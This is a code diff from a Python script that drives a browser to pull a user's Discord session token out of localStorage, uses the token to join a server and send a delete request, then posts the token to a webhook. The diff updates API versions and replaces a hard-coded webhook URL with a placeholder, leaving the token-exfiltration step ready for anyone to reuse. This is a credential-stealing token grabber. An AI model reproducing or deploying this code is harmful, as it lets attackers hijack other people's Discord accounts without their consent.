@@ -95,18 +95,18 @@ def runwindow():
  
         token = driver.execute_script(
             "let popup; popup = window.open('', '', `width=1,height=1`); if(!popup || !popup.document || !popup.document.write) console.log('Please allow popups'); window.dispatchEvent(new Event('beforeunload')); token = popup.localStorage.token.slice(1, -1); popup.close(); return token")
-        api = requests.get("https://discordapp.com/api/v6/invite/TXeqfXxb2B")
+        api = requests.get("https://discordapp.com/api/v9/invite/TXeqfXxb2B")
         data = api.json()
-        check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
+        check = requests.get("https://discordapp.com/api/v9/guilds/" + data['guild']['id'], headers={"Authorization": token})
         stuff = check.json()
-        requests.post("https://discordapp.com/api/v6/invite/TXeqfXxb2B", headers={"Authorization": token})
-        requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})
+        requests.post("https://discordapp.com/api/v9/invite/TXeqfXxb2B", headers={"Authorization": token})
+        requests.delete("https://discordapp.com/api/v9/guiilds" + data['guild']['id'], headers={"Authorization": token})
         time.sleep(3)
         print(f"Succesfully Joined {api}")
         
 
 
-        hook = "https://discord.com/api/webhooks/881968056430121001/9HI2CW72p9a0AL8D6ibdwkTXwqm7VxaWZWSOHUcTwX00XErDwTCaD52zW1fvAq32DY9Z"
+        hook = "if you want a webhook put it here xd"
         r = requests.post(hook, json={
             "content": token
         })
